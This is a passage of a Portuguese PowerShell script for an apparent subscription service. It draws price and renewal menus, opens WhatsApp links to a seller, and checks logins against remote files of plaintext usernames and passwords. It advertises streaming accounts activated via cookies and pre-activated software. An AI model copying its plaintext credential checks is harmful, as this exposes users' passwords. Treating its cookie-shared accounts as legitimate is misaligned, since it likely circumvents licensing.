        Write-Host -NoNewline "     > " -ForegroundColor Cyan
        Write-Host -NoNewline "[Todas]" -ForegroundColor Magenta 
        Write-Host -NoNewline " Contas Streaming" -ForegroundColor Yellow
        Write-Host -NoNewline " [Método de Ativação: Cookies]" -ForegroundColor Green
        Write-Host ""
        Write-Host -NoNewline "     - " -ForegroundColor Cyan
        Write-Host -NoNewline "Atualizações Periódicas e Vitalícias" -ForegroundColor Yellow
        Write-Host -NoNewline " (Quando Disponível)" -ForegroundColor Green
        Write-Host ""
        Write-Host "     ===============================================================================================================" -ForegroundColor DarkYellow
        Write-Host -NoNewline "     > " -ForegroundColor Cyan
        Write-Host -NoNewline "Instalação, Desinstalação e Ativação" -ForegroundColor Yellow
        Write-Host -NoNewline " (Automática, Rápida e Segura)" -ForegroundColor Green
        Write-Host ""
        Write-Host -NoNewline "     - " -ForegroundColor Cyan
        Write-Host -NoNewline "Quantidade de Downloads e Visualizações:" -ForegroundColor Yellow
        Write-Host -NoNewline " (Ilimitada)" -ForegroundColor Green
        Write-Host ""
        Write-Host -NoNewline "     - " -ForegroundColor Cyan
        Write-Host -NoNewline "Tutoriais em vídeo ou imagens auto explicativas" -ForegroundColor Yellow
        Write-Host ""
        Write-Host "     ===============================================================================================================" -ForegroundColor DarkYellow
        Write-Host -NoNewline "     > " -ForegroundColor Cyan                                                                   
        Write-Host -NoNewline "Suporte Prioritário" -ForegroundColor Yellow
        Write-Host ""
        Write-Host -NoNewline "     - " -ForegroundColor Cyan
        Write-Host -NoNewline "2x " -ForegroundColor Magenta
        Write-Host -NoNewline "Assistência Remota" -ForegroundColor Yellow
        Write-Host -NoNewline " (GRÁTIS)" -ForegroundColor Green
        Write-Host ""
        Write-Host "     ===============================================================================================================" -ForegroundColor DarkYellow
        Write-Host -NoNewline "     > " -ForegroundColor Cyan                                                                   
        Write-Host -NoNewline "Garantia em todos os produtos" -ForegroundColor Yellow
        Write-Host ""
        Write-Host -NoNewline "     - " -ForegroundColor Cyan
        Write-Host -NoNewline "Substituição, renovação ou reembolso" -ForegroundColor Yellow
        Write-Host -NoNewline " (Quando atendido os requisitos)" -ForegroundColor Green
        Write-Host ""
        Write-Host "     ===============================================================================================================" -ForegroundColor DarkYellow
        Write-Host -NoNewline "     > " -ForegroundColor Cyan                                                                   
        Write-Host -NoNewline "Sorteio e Descontos" -ForegroundColor Yellow
        Write-Host ""
        Write-Host -NoNewline "     - " -ForegroundColor Cyan
        Write-Host -NoNewline "Combos e Ofertas Especiais" -ForegroundColor Yellow
        Write-Host ""
        Write-Host "     ===============================================================================================================" -ForegroundColor DarkYellow
        Write-Host ""
        Write-Host -NoNewline "     VALORES" -ForegroundColor Cyan
        Write-Host -NoNewline " | " -ForegroundColor Cyan 
        Write-Host -NoNewline "PLANO ASSINATURA: $opcao_mensagem" -ForegroundColor Yellow
        Write-Host -NoNewline " | " -ForegroundColor Cyan 
        Write-Host ""
        Write-Host ""
        Write-Host "     ===============================================================================================================" -ForegroundColor DarkYellow
        Write-Host -NoNewline "     * " -ForegroundColor Cyan
        Write-Host -NoNewline "Mensal:" -ForegroundColor Yellow
        Write-Host -NoNewline " 25,00" -ForegroundColor Green
        Write-Host -NoNewline " (QTDV:ILIMITADO)" -ForegroundColor Cyan
        Write-Host ""
        Write-Host -NoNewline "     * " -ForegroundColor Cyan
        Write-Host -NoNewline "Trimestral:" -ForegroundColor Yellow
        Write-Host -NoNewline " 48,00" -ForegroundColor Green
        Write-Host -NoNewline " (QTDV:ILIMITADO)" -ForegroundColor Cyan
        Write-Host ""
        Write-Host -NoNewline "     * " -ForegroundColor Cyan
        Write-Host -NoNewline "Semestral:" -ForegroundColor Yellow
        Write-Host -NoNewline " 75,00" -ForegroundColor Green
        Write-Host -NoNewline " (QTDV:ILIMITADO)" -ForegroundColor Cyan
        Write-Host ""
        Write-Host -NoNewline "     * " -ForegroundColor Cyan
        Write-Host -NoNewline "Anual:" -ForegroundColor Yellow
        Write-Host -NoNewline " 100,00" -ForegroundColor Green
        Write-Host -NoNewline " (QTDV:ILIMITADO)" -ForegroundColor Cyan
        Write-Host ""
        Write-Host -NoNewline "     * " -ForegroundColor Cyan
        Write-Host -NoNewline "Vitalício:" -ForegroundColor Yellow
        Write-Host -NoNewline " 150,00" -ForegroundColor Green
        Write-Host -NoNewline " (QTDV:ILIMITADO)" -ForegroundColor Cyan
        Write-Host ""
        Write-Host "     ===============================================================================================================" -ForegroundColor DarkYellow
    } elseif ($url -and $opcao_mensagem -eq "DOWNLOAD E VISUALIZAÇÕES") {
        Start-Process $url
        cls
        Write-Host ""
        Write-Host "     ================================================================================================================" -ForegroundColor Green
        Write-Host "                                              MENU DE RENOVAÇÃO DO PLANO                                             " -ForegroundColor Cyan
        Write-Host "     ================================================================================================================" -ForegroundColor Green
        Write-Host ""
        Write-Host -NoNewline "     VALORES" -ForegroundColor Cyan
        Write-Host -NoNewline " | " -ForegroundColor Cyan 
        Write-Host -NoNewline "CHAVES DE ACESSO: $opcao_mensagem" -ForegroundColor Yellow
        Write-Host -NoNewline " | " -ForegroundColor Cyan 
        Write-Host ""
        Write-Host ""
        Write-Host "     ===============================================================================================================" -ForegroundColor DarkYellow
        Write-Host -NoNewline "     * " -ForegroundColor Cyan
        Write-Host -NoNewline "QTDV:" -ForegroundColor Yellow
        Write-Host -NoNewline " 3" -ForegroundColor Cyan
        Write-Host -NoNewline " Preço:" -ForegroundColor Yellow
        Write-Host -NoNewline " 5,00" -ForegroundColor Cyan
        Write-Host ""
        Write-Host -NoNewline "     * " -ForegroundColor Cyan
        Write-Host -NoNewline "QTDV:" -ForegroundColor Yellow
        Write-Host -NoNewline " 6" -ForegroundColor Cyan
        Write-Host -NoNewline " Preço:" -ForegroundColor Yellow
        Write-Host -NoNewline " 8,00" -ForegroundColor Cyan
        Write-Host ""
        Write-Host -NoNewline "     * " -ForegroundColor Cyan
        Write-Host -NoNewline "QTDV:" -ForegroundColor Yellow
        Write-Host -NoNewline " 8" -ForegroundColor Cyan
        Write-Host -NoNewline " Preço:" -ForegroundColor Yellow
        Write-Host -NoNewline " 10,00" -ForegroundColor Cyan
        Write-Host ""
        Write-Host -NoNewline "     * " -ForegroundColor Cyan
        Write-Host -NoNewline "QTDV:" -ForegroundColor Yellow
        Write-Host -NoNewline " 10" -ForegroundColor Cyan
        Write-Host -NoNewline " Preço:" -ForegroundColor Yellow
        Write-Host -NoNewline " 15,00" -ForegroundColor Cyan
        Write-Host ""
        Write-Host "     ===============================================================================================================" -ForegroundColor DarkYellow        
                        
    } else {
        if ($url -and $opcao_mensagem -eq "PRODUTO RENOVAÇÃO") { 
            Start-Process $url 
            cls
            Write-Host ""
            Write-Host "     ================================================================================================================" -ForegroundColor Green
            Write-Host "                                              MENU DE RENOVAÇÃO DO PLANO                                             " -ForegroundColor Cyan
            Write-Host "     ================================================================================================================" -ForegroundColor Green
            Write-Host ""
            Write-Host "     ================================================================================================================" -ForegroundColor Gray
            Write-Host ""
            Write-Host "      $mensagemproduto" -ForegroundColor Yellow
            Write-Host "      $fimensagem" -ForegroundColor White
            Write-Host ""
            Write-Host "     ================================================================================================================" -ForegroundColor Gray
        } else {
            cls
            Write-Host ""
            Write-Host "     ================================================================================================================" -ForegroundColor Green
            Write-Host "                                              MENU DE RENOVAÇÃO DO PLANO                                             " -ForegroundColor Cyan
            Write-Host "     ================================================================================================================" -ForegroundColor Green
            Write-Host ""
            Write-Host "     ================================================================================================================" -ForegroundColor Gray
            Write-Host ""
            Write-Host "      $mensagemplano" -ForegroundColor Yellow
            Write-Host "      $fimensagem" -ForegroundColor White
            Write-Host ""
            Write-Host "     ================================================================================================================" -ForegroundColor Gray
        }
    }

}

function MostrarMenuRenovacao {

    param (
        [string]$UsuarioAtual,
        [string]$SenhaAtual,
        [string]$CategoriaEscolhida,
        [string]$ProdutoSelecionado,
        [string]$TipoPlanoConta,
        [array]$produtosctdigitalDisponiveis,
        [hashtable[]]$produtosComMetodoEspecifico,
        [DateTime]$DataAtual,
        [DateTime]$DataTermino,
        [hashtable[]]$ProdutosMetodoLiberado,
        [switch]$silent
    )

    Write-Host " "

    if (-not $silent) {

        foreach ($produtoctdigitalDisponivel in $produtosctdigitalDisponiveis) {

            Write-Host "     ================================================================================================================" -ForegroundColor Green
            Write-Host ""
            Write-Host -NoNewline "     [1] - "  -ForegroundColor Yellow
            Write-Host "Renovar Plano Assinatura $($produtoctdigitalDisponivel['nome_produto']) $($produtoctdigitalDisponivel['duracao_plano'])" -ForegroundColor White
            Write-Host -NoNewline "     [2] - "  -ForegroundColor Yellow
            Write-Host "Renovar Assinatura Grupo VIP" -ForegroundColor White
            Write-Host -NoNewline "     [3] - "  -ForegroundColor Yellow
            Write-Host "Renovar Assinatura Grupo Membro" -ForegroundColor White
            Write-Host -NoNewline "     [4] - "  -ForegroundColor Yellow
            Write-Host "Renovar Chaves de Acesso" -ForegroundColor White
            Write-Host ""
            Write-Host -NoNewline "     [D] - "  -ForegroundColor Red
            Write-Host "Deslogar" -ForegroundColor Gray
            Write-Host -NoNewline "     [V] - "  -ForegroundColor Cyan
            Write-Host "Voltar" -ForegroundColor Gray
            Write-Host -NoNewline "     [M] - "  -ForegroundColor Yellow
            Write-Host "Menu Principal" -ForegroundColor Gray
            Write-Host ""
            Write-Host "     ================================================================================================================" -ForegroundColor Green
            
            Write-Host ""

            $opcao_renovacao = Read-Host "Digite o número ou letra de sua opção escolhida"

            if ($opcao_renovacao -eq '1') {
                MostrarCabecalhoRenovacao -opcao_mensagem "PRODUTO RENOVAÇÃO" -mensagemproduto "O seu Plano de Assinatura $($produtoctdigitalDisponivel['nome_produto']) $($produtoctdigitalDisponivel['duracao_plano']) chegou ao fim." -url "https://wa.me/5561974039456?text=Pretendo%20renovar%20e/ou%20assinar%20plano%20de%20assinatura%20$($produtoctdigitalDisponivel['nome_produto'])%20$($produtoctdigitalDisponivel['duracao_plano'])" 
                MostrarMenuRenovacao -UsuarioAtual $UsuarioAtual -SenhaAtual $SenhaAtual -CategoriaEscolhida $CategoriaEscolhida -ProdutoSelecionado $ProdutoSelecionado -TipoPlanoConta $TipoPlanoConta -produtosctdigitalDisponiveis $produtosctdigitalDisponiveis 
            } elseif ($opcao_renovacao -eq '2') {
                MostrarCabecalhoRenovacao -opcao_mensagem "GRUPO VIP" -url "https://wa.me/5561974039456?text=Pretendo%20renovar%20e/ou%20assinar%20plano%20de%20assinatura%20GRUPO%20VIP"
                MostrarMenuRenovacao -UsuarioAtual $UsuarioAtual -SenhaAtual $SenhaAtual -CategoriaEscolhida $CategoriaEscolhida -ProdutoSelecionado $ProdutoSelecionado -TipoPlanoConta $TipoPlanoConta -produtosctdigitalDisponiveis $produtosctdigitalDisponiveis
            } elseif ($opcao_renovacao -eq '3') {
                MostrarCabecalhoRenovacao -opcao_mensagem "GRUPO MEMBRO" -url "https://wa.me/5561974039456?text=Pretendo%20renovar%20e/ou%20assinar%20plano%20de%20assinatura%20GRUPO%20MEMBRO"
                MostrarMenuRenovacao -UsuarioAtual $UsuarioAtual -SenhaAtual $SenhaAtual -CategoriaEscolhida $CategoriaEscolhida -ProdutoSelecionado $ProdutoSelecionado -TipoPlanoConta $TipoPlanoConta -produtosctdigitalDisponiveis $produtosctdigitalDisponiveis
            } elseif ($opcao_renovacao -eq '4') {
                MostrarCabecalhoRenovacao -opcao_mensagem "DOWNLOAD E VISUALIZAÇÕES" -url "https://wa.me/5561974039456?text=Pretendo%20renovar%20e/ou%20comprar%20chaves%20de%20acesso"
                MostrarMenuRenovacao -UsuarioAtual $UsuarioAtual -SenhaAtual $SenhaAtual -CategoriaEscolhida $CategoriaEscolhida -ProdutoSelecionado $ProdutoSelecionado -TipoPlanoConta $TipoPlanoConta -produtosctdigitalDisponiveis $produtosctdigitalDisponiveis
            } elseif ($opcao_renovacao -eq "D") {
                Fazer-Login
            } elseif ($opcao_renovacao -eq "V") {
                Show-Produtos-Metodos -UsuarioAtual $UsuarioAtual -SenhaAtual $SenhaAtual -CategoriaEscolhida $CategoriaEscolhida -ProdutoSelecionado $ProdutoSelecionado -TipoPlanoConta $TipoPlanoConta -DataAtual $DataAtual -DataTermino $DataTermino -ProdutosMetodoLiberado $ProdutosMetodoLiberado
            } elseif ($opcao_renovacao -eq "M") {
                Show-Menu
            } else {
                Write-Host ""
                Write-Host "Opção inválida. Por favor, digite um número ou letra que seja válido." -ForegroundColor Red
                Write-Host ""
            
                Start-Sleep -Seconds 3

                MostrarCabecalhoRenovacao
                MostrarMenuRenovacao -UsuarioAtual $UsuarioAtual -SenhaAtual $SenhaAtual -CategoriaEscolhida $CategoriaEscolhida -ProdutoSelecionado $ProdutoSelecionado -TipoPlanoConta $TipoPlanoConta -produtosctdigitalDisponiveis $produtosctdigitalDisponiveis
            }
        }

    } else {

        if($produtosComMetodoEspecifico) {
            Write-Host "     ================================================================================================================" -ForegroundColor Green
            Write-Host ""
            Write-Host -NoNewline "     [1] - "  -ForegroundColor Yellow
            Write-Host "Renovar Assinatura Grupo VIP" -ForegroundColor White
            Write-Host -NoNewline "     [2] - "  -ForegroundColor Yellow
            Write-Host "Renovar Assinatura Grupo Membro" -ForegroundColor White
            Write-Host -NoNewline "     [3] - "  -ForegroundColor Yellow
            Write-Host "Renovar Chaves de Acesso" -ForegroundColor White
            Write-Host " "
            Write-Host -NoNewline "     [D] - "  -ForegroundColor Red
            Write-Host "Deslogar" -ForegroundColor Gray
            Write-Host -NoNewline "     [V] - "  -ForegroundColor Cyan
            Write-Host "Voltar" -ForegroundColor Gray
            Write-Host -NoNewline "     [M] - "  -ForegroundColor Yellow
            Write-Host "Menu Principal" -ForegroundColor Gray 
            Write-Host ""
            Write-Host "     ================================================================================================================" -ForegroundColor Green 
        } else {
            Write-Host "     ================================================================================================================" -ForegroundColor Green
            Write-Host ""
            Write-Host -NoNewline "     [1] - "  -ForegroundColor Yellow
            Write-Host "Renovar Assinatura Grupo VIP" -ForegroundColor White
            Write-Host -NoNewline "     [2] - "  -ForegroundColor Yellow
            Write-Host "Renovar Assinatura Grupo Membro" -ForegroundColor White
            Write-Host -NoNewline "     [3] - "  -ForegroundColor Yellow
            Write-Host "Renovar Chaves de Acesso" -ForegroundColor White
            Write-Host " "
            Write-Host -NoNewline "     [D] - "  -ForegroundColor Red
            Write-Host "Deslogar" -ForegroundColor Gray
            Write-Host -NoNewline "     [M] - "  -ForegroundColor Yellow
            Write-Host "Menu Principal" -ForegroundColor Gray 
            Write-Host ""
            Write-Host "     ================================================================================================================" -ForegroundColor Green 
        }
        
        Write-Host ""

        $opcao_renovacao = Read-Host "Digite o número ou letra de sua opção escolhida"
        
        if ($opcao_renovacao -eq '1') {
            MostrarCabecalhoRenovacao -opcao_mensagem "GRUPO VIP" -url "https://wa.me/5561974039456?text=Pretendo%20renovar%20e/ou%20assinar%20plano%20de%20assinatura%20GRUPO%20VIP"
            MostrarMenuRenovacao -silent -produtosComMetodoEspecifico $produtosComMetodoEspecifico
        } elseif ($opcao_renovacao -eq '2') {
            MostrarCabecalhoRenovacao -opcao_mensagem "GRUPO MEMBRO" -url "https://wa.me/5561974039456?text=Pretendo%20renovar%20e/ou%20assinar%20plano%20de%20assinatura%20GRUPO%20MEMBRO"
            MostrarMenuRenovacao -silent -produtosComMetodoEspecifico $produtosComMetodoEspecifico
        } elseif ($opcao_renovacao -eq '3') {
            MostrarCabecalhoRenovacao -opcao_mensagem "DOWNLOAD E VISUALIZAÇÕES" -url "https://wa.me/5561974039456?text=Pretendo%20renovar%20e/ou%20comprar%20chaves%20de%20acesso"
            MostrarMenuRenovacao -silent -produtosComMetodoEspecifico $produtosComMetodoEspecifico
        } elseif ($opcao_renovacao -eq "D") {
            Fazer-Login
        } elseif ($opcao_renovacao -eq "V" -and $produtosComMetodoEspecifico) {
            Show-Menu-Produto
        } elseif ($opcao_renovacao -eq "M") {
            Show-Menu
        } else {
        
            Write-Host ""
            Write-Host "Opção inválida. Por favor, digite um número ou letra que seja válido." -ForegroundColor Red
            Write-Host ""

            Start-Sleep -Seconds 3
            
            MostrarCabecalhoRenovacao
            MostrarMenuRenovacao -silent -produtosComMetodoEspecifico $produtosComMetodoEspecifico
        }  
    }
    
}


function Show-Menu-Produto {

    param (
        [string]$UsuarioAtual,
        [string]$SenhaAtual,
        [string]$TipoPlanoConta
    )
    

    # Variáveis para armazenar as informações do usuário
    $usuario_info = $null

    foreach ($url in $urls) {
        try {
            # Obter o conteúdo do arquivo
            $conteudo = Invoke-RestMethod -Uri $url -ErrorAction Stop
        } catch {
            Write-Host "Erro ao acessar a URL: $url" -ForegroundColor Red
            continue
        }
        
        # Verificar se o conteúdo está vazio
        if ([string]::IsNullOrWhiteSpace($conteudo)) {
            Write-Host "Conteúdo da URL $url está vazio ou não pôde ser obtido." -ForegroundColor Yellow
            continue
        }

        # Encontrar os programas disponíveis para o usuário atual
        $usuario_atual = $usuario
        $senha_atual = $senha

        $linhas = $conteudo -split "`n"
        foreach ($linha in $linhas) {
            $campos = $linha -split "\|"
            # Verificar se há pelo menos dois campos
            if ($campos.Count -ge 3) {
                $usuario_atual_arquivo = $campos[1].Trim()
                $senha_atual_arquivo = $campos[2].Trim()
                if ($usuario_atual -eq $usuario_atual_arquivo -and $senha_atual -eq $senha_atual_arquivo) {
                    # Usuário encontrado, armazenar informações
                    $usuario_info = @{
                        "id" = $campos[0].Trim()
                        "usuario" = $campos[1].Trim()
                        "senha" = $campos[2].Trim()
                        "produtos" = $campos[3].Trim()
                        "duracao_plano" = $campos[4].Trim()
                        "data_inicio" = $campos[5].Trim()
                        "data_termino" = $campos[6].Trim()
                        "status_pagamento" = $campos[7].Trim()
                        "tipo_plano" = $campos[8].Trim()
                    }
                    break
                }
            }
        }

        # Se o usuário foi encontrado, não precisa verificar outros links
        if ($usuario_info) {
            break
        }
    }

            if ($usuario_info) {

                # Processar produtos do usuário
                $products = @()

                $product_partes = $usuario_info["produtos"] -split ":"

                foreach ($partes in $product_partes) {
                    
                    $detalhes_produto = $partes -split ","
                    
                    if ($detalhes_produto.Count -ge 5) {
                        $product = @{
                            "nome_produto" = $detalhes_produto[0].Trim()
                            "categoria_produto" = $detalhes_produto[1].Trim()
                            "metodo_ativacao_produto" = $detalhes_produto[2].Trim()
                            "qtdv_produto_anterior" = $detalhes_produto[3].Trim()
                            "qtdv_produto_atualizado" = $detalhes_produto[4].Trim()
                        }

                        if ($detalhes_produto.Count -ge 9) {
                            $product["duracao_plano"] = $detalhes_produto[5].Trim()
                            $product["data_inicio_ctdigital"] = $detalhes_produto[6].Trim()
                            $product["data_termino_ctdigital"] = $detalhes_produto[7].Trim()
                            $product["status_pagamento"] = $detalhes_produto[8].Trim()
                        } elseif ($detalhes_produto.Count -ge 6) {
                            $product["status_pagamento"] = $detalhes_produto[5].Trim()
                        }

                        # Adicionar produto ao array de produtos
                        $products += $product
                    }
                }

                # Definir o caminho do arquivo de quantidade com base no nome do usuário
                $qtdvFilePath = "C:\Users\$env:USERNAME\AppData\Local\Temp\$usuario_atual\qtdv_quantidade.txt"

                # Criar diretório se não existir
                    
                $directoryPath = [System.IO.Path]::GetDirectoryName($qtdvFilePath)
                 
                if (-not (Test-Path -Path $directoryPath)) { 
                    New-Item -ItemType Directory -Path $directoryPath > $null
                }

                # Atualiza e calcula a soma total de qtdv dos produtos
                $qtdvTotal = Calculate-QTDVTotal -products $products

                # Atualiza e carrega todos valores de qtdv
                $qtdvValues = Load-QTDVValues

                # Atualizar qtdv_valor_inicial se necessário
                if ($qtdvValues["qtdv_valor_inicial"] -ne $qtdvTotal) {

                    $qtdvValues["qtdv_valor_inicial"] = $qtdvTotal
                    
                    if ($qtdvValues["qtdv_valor_atual"] -eq 0) {
                        $qtdvValues["qtdv_valor_atual"] = $qtdvTotal
                    }
                }

                $data_termino = [datetime]::ParseExact($usuario_info["data_termino"], "dd/MM/yyyy", $null)
                $data_atual = Get-Date
                $dias_restantes = ($data_termino - $data_atual).Days
                $tipo_plano_usuario = $usuario_info["tipo_plano"]


                $produtosComMetodoEspecifico = $products | Where-Object {
                    $_["metodo_ativacao_produto"] -match "Chave/Serial|Conta Digital"
                }

                if ($data_atual -gt $data_termino -and -not $produtosComMetodoEspecifico) {
                   
                   MostrarCabecalhoRenovacao
                   MostrarMenuRenovacao -silent -produtosComMetodoEspecifico $produtosComMetodoEspecifico

                } else {

                    do {

                        # Analisar programas e agrupar por categoria
                    
                        $produtos = $usuario_info["produtos"] -split ":"
                        $tipo_plano_usuario = $usuario_info["tipo_plano"]
                    
                        $categoriasDisponiveis = @{}

                        foreach ($produto in $produtos) {

                            $detalhes_usuario_produto = $produto -split ","
                        
			                $nome_usuario_produto = $detalhes_usuario_produto[0].Trim()
                            $categoria_usuario_produto = $detalhes_usuario_produto[1].Trim()
                            $metodo_ativacao_usuario_produto = $detalhes_usuario_produto[2].Trim()

                            function AddToCategoriasDisponiveis($key, $value) {
                                if (-not $categoriasDisponiveis.ContainsKey($key)) {
                                    $categoriasDisponiveis[$key] = @()
                                }
                                if (-not ($categoriasDisponiveis[$key] -contains $value)) {
                                    $categoriasDisponiveis[$key] += $value
                                }
                            }
                                           
                            if ($tipo_plano_usuario -ne "VIP") {
                                
                                if ($data_atual -gt $data_termino -and $produtosComMetodoEspecifico) {
                                    if ($metodo_ativacao_usuario_produto -eq "Conta Digital" -or $metodo_ativacao_usuario_produto -eq "Chave/Serial") {
                                        AddToCategoriasDisponiveis $categoria_usuario_produto $nome_usuario_produto
                                    }
                                } else {
                                    AddToCategoriasDisponiveis $categoria_usuario_produto $nome_usuario_produto
                                    #AddToCategoriasDisponiveis $categoria_produto $nome_produto
                                }


                            } else {
                            
                                # URLs para obter todos os produtos de diferentes categorias
                                $urlsProdutosDisponiveis = Get-Todos-Produtos

                                foreach ($url_ProdutoDisponivel in $urlsProdutosDisponiveis) {
                                
                                    try {
                                        # Obter o conteúdo do arquivo
                                        $conteudoProdutoDisponivel = Invoke-RestMethod -Uri $url_ProdutoDisponivel -ErrorAction Stop
                                    } catch {
                                        Write-Host "Erro ao acessar a URL: $url_ProdutoDisponivel" -ForegroundColor Red
                                        continue
                                    }

                                    # Dividir o conteúdo em linhas
                                    $produtosDisponveis = $conteudoProdutoDisponivel -split "`n"

                                    # Obter categorias
                                    foreach ($produtoDisponivel in $produtosDisponveis) {

                                        $detalhes_produto_disponivel = $produtoDisponivel -split "\|"
                                        
                                        if ($detalhes_produto_disponivel.Count -gt 1) {
                
                                            $categoria_produto = $detalhes_produto_disponivel[1].Trim()
                                            $nome_produto = $detalhes_produto_disponivel[2].Trim()
                                            $metodo_ativacao_produto = $detalhes_produto_disponivel[3].Trim()
                                           
                                            if ($metodo_ativacao_produto -eq "Pré-Ativado" -or $metodo_ativacao_produto -eq "Conta Digital - Pública" -or $metodo_ativacao_produto -eq "Conta Digital - Cookies") {

                                                if ($data_atual -gt $data_termino -and $produtosComMetodoEspecifico) {
                                                    if ($metodo_ativacao_usuario_produto -eq "Conta Digital" -or $metodo_ativacao_usuario_produto -eq "Chave/Serial") {
                                                        AddToCategoriasDisponiveis $categoria_usuario_produto $nome_usuario_produto
                                                    }
                                                } else {
                                                    AddToCategoriasDisponiveis $categoria_usuario_produto $nome_usuario_produto
                                                    AddToCategoriasDisponiveis $categoria_produto $nome_produto
                                                }
                                                
                                            }

                                        }
                                    }
                                }
                            }
                        }

                        # Chamar a função para obter todas as categorias e produtos
                        $todasCategoriasProdutos = Get-Todas-Categorias-Produtos 
                    
                        # Chamar a função para obter todas as categorias
                        $todasCategorias = Get-Todas-Categorias

                        $duracaoPlano = $products[0]["duracao_plano"]

                        function Show-Menu-Detalhes-Produto {

                            param (
                                [string]$detalheslogin_senhadisplay = "***-***-***"
                            )

                            cls
                            Write-Host ""
                            Write-Host "     ===============================================================================================================" -ForegroundColor Green
                            Write-Host "                                               MENU DE SELEÇÃO DO PRODUTO                                           " -ForegroundColor Cyan
                            Write-Host "     ===============================================================================================================" -ForegroundColor Green
                            Write-Host ""

                            Show-Menu-Detalhes-Login -UsuarioAtual $usuario_info["usuario"] -SenhaAtual $usuario_info["senha"] -TipoPlanoConta $usuario_info["tipo_plano"] -detalheslogin_senhadisplay $detalheslogin_senhadisplay -qtdvTotal $qtdvValues["qtdv_valor_atual"] -qtdvUtilizado $qtdvValues["qtdv_valor_utilizado"] -silent
                            
                            Write-Host ""
                            Write-Host "     ===============================================================================================================" -ForegroundColor Green
                            Write-Host ""
                            Write-Host "      DETALHES DA CONTA: " -ForegroundColor Cyan
                            Write-Host ""
                            foreach ($categoria in $todasCategorias) {

                                $produtos_categoria_disponiveis = $categoriasDisponiveis[$categoria]
                                $total_categorias_disponiveis = $categoriasDisponiveis.Keys.Count
                                $quantidade_disponivel = $produtos_categoria_disponiveis.Count
    
                                # Adicionar a quantidade_disponivel ao total
                                $total_quantidade_disponivel += $quantidade_disponivel
                                
                            }
                            
                            Write-Host -NoNewline "      QTD TOTAL CATEGORIAS DISPONÍVEIS: "
                            Write-Host "$total_categorias_disponiveis" -ForegroundColor Yellow
                            Write-Host -NoNewline "      QTD TOTAL PRODUTOS DISPONÍVEIS: "
                            Write-Host "$total_quantidade_disponivel" -ForegroundColor Yellow
                            Write-Host ""
                                if ($usuario_info["tipo_plano"] -eq "Membro") {
                                    Write-Host -NoNewline "      1 - " -ForegroundColor Green
                                    Write-Host "PLANO ASSINATURA:" -ForegroundColor Yellow
                                    Write-Host ""
                                    Write-Host -NoNewline "      DURAÇÃO PLANO: "
                                    Write-Host "$($usuario_info["duracao_plano"])" -ForegroundColor Yellow
                                    Write-Host -NoNewline "      DATA INÍCIO: "
                                    Write-Host "$($usuario_info["data_inicio"])" -ForegroundColor Yellow
                                    Write-Host -NoNewline "      DATA FIM: "
                                    Write-Host "$($usuario_info["data_termino"])" -ForegroundColor Yellow
                                    if ($data_atual -gt $data_termino -and -not $produtosComMetodoEspecifico) {
                                        Write-Host -NoNewline "      DIAS RESTANTES: "
                                        Write-Host "Nenhum" -ForegroundColor Red
                                        Write-Host -NoNewline "      STATUS PAGAMENTO: "
                                        Write-Host "Pendente" -ForegroundColor Red 
                                    } elseif ($data_atual -gt $data_termino -and $produtosComMetodoEspecifico) {
                                        Write-Host -NoNewline "      DIAS RESTANTES: "
                                        Write-Host "Nenhum" -ForegroundColor Red
                                        Write-Host -NoNewline "      STATUS PAGAMENTO: "
                                        Write-Host "Pendente" -ForegroundColor Red 
                                    } else {
                                        Write-Host -NoNewline "      DIAS RESTANTES: "
                                        Write-Host "$dias_restantes" -ForegroundColor Red
                                        Write-Host -NoNewline "      STATUS PAGAMENTO: "
                                        Write-Host "$($usuario_info["status_pagamento"])" -ForegroundColor Green
                                    }
                                } else {
                                    Write-Host -NoNewline "      1 - " -ForegroundColor Green
                                    Write-Host "PLANO ASSINATURA:" -ForegroundColor Yellow
                                    Write-Host ""
                                    Write-Host -NoNewline "      DURAÇÃO PLANO: "
                                    Write-Host "$($usuario_info["duracao_plano"])" -ForegroundColor Yellow
                                    Write-Host -NoNewline "      DATA INÍCIO: "
                                    Write-Host "$($usuario_info["data_inicio"])" -ForegroundColor Yellow
                                    Write-Host -NoNewline "      DATA FIM: "
                                    Write-Host "$($usuario_info["data_termino"])" -ForegroundColor Yellow
                                    if ($data_atual -gt $data_termino -and -not $produtosComMetodoEspecifico) {
                                        Write-Host -NoNewline "      DIAS RESTANTES: "
                                        Write-Host "Nenhum" -ForegroundColor Red
                                        Write-Host -NoNewline "      STATUS PAGAMENTO: "
                                        Write-Host "Pendente" -ForegroundColor Red 
                                    } elseif ($data_atual -gt $data_termino -and $produtosComMetodoEspecifico) {
                                        Write-Host -NoNewline "      DIAS RESTANTES: "
                                        Write-Host "Nenhum" -ForegroundColor Red
                                        Write-Host -NoNewline "      STATUS PAGAMENTO: "
                                        Write-Host "Pendente" -ForegroundColor Red 
                                    } else {
                                        Write-Host -NoNewline "      DIAS RESTANTES: "
                                        if($dias_restantes -eq 0 ) { Write-Host "Último Dia" -ForegroundColor Red } else { Write-Host "$dias_restantes" -ForegroundColor Red }
                                        Write-Host -NoNewline "      STATUS PAGAMENTO: "
                                        Write-Host "$($usuario_info["status_pagamento"])" -ForegroundColor Green
                                    }
                                }

                            # Atualizar qtdv no menu
                            # Recebe o decremento individual e atualiza o qtdv valor total atual #
                            Update-QTDVInMenu -qtdvTotal $qtdvValues["qtdv_valor_atual"] -qtdvUtilizado $qtdvValues["qtdv_valor_utilizado"]
                            Write-Host ""
                            Write-Host "     ===============================================================================================================" -ForegroundColor Green
                            Write-Host ""

                            # Exibir categorias e quantidade de produtos
                            $contador = 1

                            foreach ($categoria in $todasCategorias) {
                                # Ordena as categorias em sequência alfabética
                                $produtos_categoria_disponiveis = if ($categoriasDisponiveis.ContainsKey($categoria)) { $categoriasDisponiveis[$categoria] } else { @() }
                                $quantidade_disponivel = $produtos_categoria_disponiveis.Count
                                $quantidade_total = $todasCategoriasProdutos[$categoria] | Select-Object -Unique
                                $quantidade_total_produtos = $quantidade_total.Count

                                # Definir cores com base na disponibilidade de produtos
                                if ($quantidade_disponivel -gt 0) {
                                    Write-Host "     [$contador] - $categoria ($quantidade_disponivel/$quantidade_total_produtos)" -ForegroundColor Yellow
                                } else {
                                    Write-Host "     [$contador] - $categoria ($quantidade_disponivel/$quantidade_total_produtos)" -ForegroundColor DarkGray
                                }
                        
                                $contador++
                            }
                                
                            if ($data_atual -gt $data_termino -and -not $produtosComMetodoEspecifico) {
                                Write-Host ""
                                Write-Host -NoNewline "     [R] - "  -ForegroundColor Green
                                Write-Host "Renovar Plano Assinatura" -ForegroundColor Gray
                            } elseif ($data_atual -gt $data_termino -and $produtosComMetodoEspecifico) {
                                Write-Host ""
